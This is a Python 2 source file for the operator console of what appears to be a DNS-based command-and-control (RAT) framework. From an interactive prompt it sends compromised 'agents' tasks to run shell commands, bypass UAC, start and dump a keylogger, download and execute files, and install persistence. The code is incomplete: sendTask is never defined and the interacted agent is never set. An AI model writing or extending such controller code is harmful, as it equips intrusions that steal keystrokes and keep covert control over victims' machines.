import cmd

activeAgents = ["PC-01","FUCK"]


def changeInteractedAgent(agent):
	print agent

class Input(cmd.Cmd):


	AGENTS = activeAgents
	prompt = "DNS-C2 #> "
	def do_agents(self,s):
		self.list_agents()
	def do_interact(self,agent):
		self.AGENTS = activeAgents
		if(agent in self.AGENTS):
			print "[+] Interacting with : " + agent + " [+]"
			changeInteractedAgent(agent)
			agentInteraction = AgentCMD()
			agentInteraction.prompt = self.prompt + "(" + agent + "): "
			agentInteraction.cmdloop()
		else:
			print "[-] Agent not valid [-]"

	def complete_interact(self, text, line, begidx, endidx):
		if not text:
			completions = self.AGENTS[:]
		else:
			completions = [ f
			for f in self.AGENTS
			if f.startswith(text)
			]
		return completions
	def do_quit(self,s):
		exit(0)
	def emptyline(self):
		pass
	def list_agents(self):
		for agent in activeAgents:
			print agent
			

def getInteractedAgent():
	global interactedAgent
	return interactedAgent



class AgentCMD(cmd.Cmd):

	# This is the Agent command line .
	def do_sysinfo(self,s):
		sendTask(interactedAgent,"{SHELL}systeminfo")
	def do_bypassuac(self,s):
		sendTask(interactedAgent,"bypassuac")
	def do_keylog_start(self,s):
		sendTask(interactedAgent,"keylog_start")
	def do_keylog_stop(self,s):
		sendTask(interactedAgent,"keylog_stop")
	def do_keylog_dump(self,s):
		sendTask(interactedAgent,"keylog_dump")
	def do_exec(self,s):
		sendTask(interactedAgent,"{SHELL}%s" % s)
	def do_downloadexecute(self,s):
		sendTask(interactedAgent,"{DOWNLOAD}%s" % s)
	def do_persist(self,s):
		sendTask(interactedAgent,"persist")
	def do_back(self,s):
		interactedAgent = ""
		return True
	def emptyline(self):
		pass